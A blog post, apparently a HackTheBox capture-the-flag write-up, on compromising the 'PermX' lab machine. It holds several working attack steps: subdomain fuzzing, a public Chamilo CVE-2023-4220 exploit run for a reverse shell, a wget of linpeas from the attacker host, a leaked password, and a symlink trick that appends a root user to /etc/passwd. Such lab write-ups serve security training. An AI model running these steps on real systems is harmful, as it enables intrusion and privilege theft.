+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#enumeration">Enumeration
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#getting-access">Getting Access
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#privilege-escalation">Privilege Escalation
+        </a>
+      </li></ul>
+      <div class="hx-mt-8 hx-border-t hx-bg-white hx-pt-8 hx-shadow-[0_-12px_16px_white] dark:hx-bg-dark dark:hx-shadow-[0_-12px_16px_#111] hx-sticky hx-bottom-0 hx-flex hx-flex-col hx-items-start hx-gap-2 hx-pb-8 dark:hx-border-neutral-800 contrast-more:hx-border-t contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx-transition-all hx-duration-75 hx-opacity-0 hx-text-xs hx-font-medium hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-100 contrast-more:hx-text-gray-800 contrast-more:dark:hx-text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx-inline ltr:hx-ml-1 rtl:hx-mr-1 hx-h-3.5 hx-w-3.5 hx-border hx-rounded-full hx-border-gray-500 hover:hx-border-gray-900 dark:hx-border-gray-400 dark:hover:hx-border-gray-100 contrast-more:hx-border-gray-800 contrast-more:dark:hx-border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx-w-full hx-break-words hx-flex hx-min-h-[calc(100vh-var(--navbar-height))] hx-min-w-0 hx-justify-center hx-pb-8 hx-pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx-w-full hx-min-w-0 hx-max-w-6xl hx-px-6 hx-pt-4 md:hx-px-12">
+        
+  <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/blog/">Blog</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">PermX - HackTheBox Write-Up</div>
+  </div>
+
+        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">PermX - HackTheBox Write-Up</h1>
+        <div class="hx-mt-4 hx-mb-16 hx-text-gray-500 hx-text-sm hx-flex hx-items-center hx-flex-wrap hx-gap-y-2"><span class="hx-mr-1">September 28, 2024</span><span class="hx-mx-1">·</span><a
+                  href="https://github.com/PrintN" target="_blank"
+                  class="hx-group hx-inline-flex hx-items-center hx-text-current hx-gap-x-1.5 hx-mx-1"
+                  title="PrintN"
+                ><img src="https://github.com/PrintN.png" alt="PrintN" class="hx-inline-block hx-h-4 hx-w-4 hx-rounded-full" loading="lazy" />
+                  <div class="group-hover:hx-underline">PrintN</div>
+                </a></div>
+        <div class="content">
+          <p><img src="./0.webp" alt="Image 0" loading="lazy" /></p>
+<h3>Introduction<span class="hx-absolute -hx-mt-20" id="introduction"></span>
+    <a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Hello👋 Today we&rsquo;re going to take a look at <a href="./https://www.hackthebox.com/machines/permx" >PermX</a> machine on HackTheBox by mtzsec. The difficulty is easy.</p>
+<p>We&rsquo;ll have to start by adding the target IP Adress to our <code>/etc/hosts</code> use nano or vim to edit this.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>YOUR_TARGET_IP<span class="o">]</span> permx.htb</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Enumeration<span class="hx-absolute -hx-mt-20" id="enumeration"></span>
+    <a href="#enumeration" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>We&rsquo;ll start by scanning for open ports with Nmap.
+<img src="./1.webp" alt="Screenshot 1" loading="lazy" /></p>
+<p>We get port 80 and 22, which means there is a website running. There is nothing much of interest on the homepage.
+<img src="./2.webp" alt="Screenshot 2" loading="lazy" /></p>
+<p>So let&rsquo;s try to see if there are any interesting directories, we&rsquo;ll use Gobuster for that.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://permx.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="./3.webp" alt="Screenshot 3" loading="lazy" /></p>
+<p>Hmmm. Let&rsquo;s try to find some subdomains with ffuf.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://permx.htb -H <span class="s2">&#34;Host:FUZZ.permx.htb&#34;</span> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw <span class="m">18</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="./4.webp" alt="Screenshot 4" loading="lazy" /></p>
+<p>And we got something. Let&rsquo;s try checking <code>lms.permx.htb</code> out. Remember to first add it to our <code>/etc/hosts</code>.
+<img src="./5.webp" alt="Screenshot 5" loading="lazy" /></p>
+<h3>Getting Access<span class="hx-absolute -hx-mt-20" id="getting-access"></span>
+    <a href="#getting-access" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>We now know that the website uses Chamilo. Let&rsquo;s try do a quick search on any exploits on Chamilo. And we find <strong>CVE-2023-4220</strong> and a exploit script:</p>
+<p><a href="./https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc" >https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc</a></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> chamilo-lms-unauthenticated-big-upload-rce-poc
+</span></span><span class="line"><span class="cl">pip install -r requirements.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Set up a listener with <code>nc -lvnp 443</code> and then we can run the main.py.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 main.py -u http://lms.permx.htb -a revshell</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="./6.webp" alt="Screenshot 6" loading="lazy" />
+<img src="./7.webp" alt="Screenshot 7" loading="lazy" /></p>
+<p>And we get a shell! Now we want to run <a href="./https://github.com/peass-ng/PEASS-ng/releases" >linpeas</a> to find any vulnerbilities, so let&rsquo;s start a http server with python on our attacker machine.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>In our shell we run.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.14.34:8000/linpeas.sh</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="./8.webp" alt="Screenshot 8" loading="lazy" />
+<img src="./9.webp" alt="Screenshot 9" loading="lazy" /></p>
+<p>We get a password from the configuration.php. Now we only need the username to be able to ssh. Which we see is <code>mtz</code> by going to the home directory.</p>
+<p><img src="./10.webp" alt="Screenshot 10" loading="lazy" /></p>
+<p>Let&rsquo;s ssh into <code>mtz</code> with the password <code>03F6lY3uXAP2bkW8</code>
+<img src="./11.webp" alt="Screenshot 11" loading="lazy" /></p>
+<p>And we get our first flag!</p>
+<p><img src="./12.webp" alt="Screenshot 12" loading="lazy" /></p>
+<h3>Privilege Escalation<span class="hx-absolute -hx-mt-20" id="privilege-escalation"></span>
+    <a href="#privilege-escalation" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>We start by running <code>sudo -l</code> and we se that we can run <code>/opt/acl.sh</code> as root.
+<img src="./13.webp" alt="Screenshot 13" loading="lazy" />
+Let&rsquo;s take a look at <code>/opt/acl.sh</code>.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$#</span><span class="s2">&#34;</span> -ne <span class="m">3</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Usage: </span><span class="nv">$0</span><span class="s2"> user perm file&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">user</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">perm</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">target</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$3</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$target</span><span class="s2">&#34;</span> !<span class="o">=</span> /home/mtz/* <span class="o">||</span> <span class="s2">&#34;</span><span class="nv">$target</span><span class="s2">&#34;</span> <span class="o">==</span> *..* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Access denied.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check if the path is a file</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$target</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Target must be a file.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/setfacl -m u:<span class="s2">&#34;</span><span class="nv">$user</span><span class="s2">&#34;</span>:<span class="s2">&#34;</span><span class="nv">$perm</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$target</span><span class="s2">&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>This script lets the user <code>mtz</code> change file permissions for any user, but only for files in the <code>/home/mtz</code> directory. It also blocks us from using path traversal.</p>
+<p>What we can do is make a symlink to the <code>/etc/passwd</code> inside the <code>/home/mtz</code> and then add a privileged user.</p>
+<p>So we first have to generate a password hash.</p>
+<p><img src="./14.webp" alt="Screenshot 14" loading="lazy" /></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /tmp
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
+</span></span><span class="line"><span class="cl">ln -s /etc/passwd passwd
+</span></span><span class="line"><span class="cl">sudo /opt/acl.sh mtz rwx /home/mtz/tmp/passwd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;printn:$1$IeeL.gZ3$gs5hdreEStMsIs6wN.lVn0:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /home/mtz/tmp/passwd</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>After running the commands above our user should now be added to the <code>/etc/passwd</code>. Now we can just <code>su printn</code> with the password <code>printn</code>.</p>
+<p>And we get root. We can now get the last flag 🥳</p>
+<p><img src="./15.webp" alt="Screenshot 15" loading="lazy" /></p>
+
+        </div>
+        
+    <div class="hx-mt-12 hx-mb-8 hx-block hx-text-xs hx-text-gray-500 ltr:hx-text-right rtl:hx-text-left dark:hx-text-gray-400">Last updated on <time datetime="2024-09-28T00:00:00.000Z">September 28, 2024</time></div>
+        
+        <div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
+        href="/blog/creative-tryhackme/"
+        title="Creative - TryHackMe Write-Up"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-pr-4 rtl:hx-pl-4"
+      ><svg class="hx-inline hx-h-5 hx-shrink-0 ltr:hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>Creative - TryHackMe Write-Up</a><a
+        href="/blog/blame-game-picoctf/"
+        title="Blame Game - PicoCTF Write-Up"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-ml-auto ltr:hx-pl-4 ltr:hx-text-right rtl:hx-mr-auto rtl:hx-pr-4 rtl:hx-text-left"
+      >Blame Game - PicoCTF Write-Up<svg class="hx-inline hx-h-5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div>
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx-pt-8">
+  
+  <div class="waves">
+    <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+      </defs>
+      <g class="parallax">
+        <use class="wave" xlink:href="#gentle-wave" x="48" y="0" fill="rgba(243,244,246,0.7)" />
+        <use class="wave" xlink:href="#gentle-wave" x="48" y="3" fill="rgba(243,244,246,0.5)" />
+        <use class="wave" xlink:href="#gentle-wave" x="48" y="5" fill="rgba(243,244,246,0.3)" />
+        <use class="wave" xlink:href="#gentle-wave" x="48" y="7" fill="#e8e9eb" />
+      </g>
+    </svg>
+  </div>
+
+  <div class="footer-container mx-auto">
+    <div class="footer-content hx-flex hx-flex-col md:hx-flex-row hx-justify-between hx-items-center hx-py-4 hx-pt-12">
+      
+      <div class="footer-nav-links hx-flex hx-flex-wrap hx-justify-center hx-gap-8 hx-mb-6 md:hx-mb-0">
+          <a href="/" class="hx-text-black dark:hx-text-black dark:hx-text-white">Home</a>
+          <a href="/#about" class="hx-ml-4 hx-text-black dark:hx-text-black dark:hx-text-white">About</a>
+          <a href="/blog" class="hx-ml-4 hx-text-black dark:hx-text-white">Blog</a>
+          <a href="/#contact" class="hx-ml-4 hx-text-black dark:hx-text-white">Contact</a>
+          <a href="/donate" class="hx-ml-4 hx-text-black dark:hx-text-white">Donate</a>
+          <a href="/#portfolio" class="hx-ml-4 hx-text-black dark:hx-text-white">Portfolio</a>
+      </div>
+      
+      <div class="social-media hx-flex hx-flex-wrap hx-justify-center hx-gap-4">
+        <a href="https://github.com/PrintN" title="GitHub" target="_blank" rel="noopener noreferrer" class="hx-text-black dark:hx-text-white">
+          <svg height=30 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+        </a>
+        <a href="https://leetcode.com/PrintN" title="LeetCode" target="_blank" rel="noopener noreferrer" class="hx-text-black dark:hx-text-white">
+          <svg height=30 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13.483 0a1.374 1.374 0 0 0-.961.438L7.116 6.226l-3.854 4.126a5.266 5.266 0 0 0-1.209 2.104 5.35 5.35 0 0 0-.125.513 5.527 5.527 0 0 0 .062 2.362 5.83 5.83 0 0 0 .349 1.017 5.938 5.938 0 0 0 1.271 1.818l4.277 4.193.039.038c2.248 2.165 5.852 2.133 8.063-.074l2.396-2.392c.54-.54.54-1.414.003-1.955a1.378 1.378 0 0 0-1.951-.003l-2.396 2.392a3.021 3.021 0 0 1-4.205.038l-.02-.019-4.276-4.193c-.652-.64-.972-1.469-.948-2.263a2.68 2.68 0 0 1 .066-.523 2.545 2.545 0 0 1 .619-1.164L9.13 8.114c1.058-1.134 3.204-1.27 4.43-.278l3.501 2.831c.593.48 1.461.387 1.94-.207a1.384 1.384 0 0 0-.207-1.943l-3.5-2.831c-.8-.647-1.766-1.045-2.774-1.202l2.015-2.158A1.384 1.384 0 0 0 13.483 0zm-2.866 12.815a1.38 1.38 0 0 0-1.38 1.382 1.38 1.38 0 0 0 1.38 1.382H20.79a1.38 1.38 0 0 0 1.38-1.382 1.38 1.38 0 0 0-1.38-1.382z"/></svg>
+        </a>
+        <a href="https://tryhackme.com/p/PrintN" title="TryHackMe" target="_blank" rel="noopener noreferrer" class="hx-text-black dark:hx-text-white">
+          <svg height=30 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 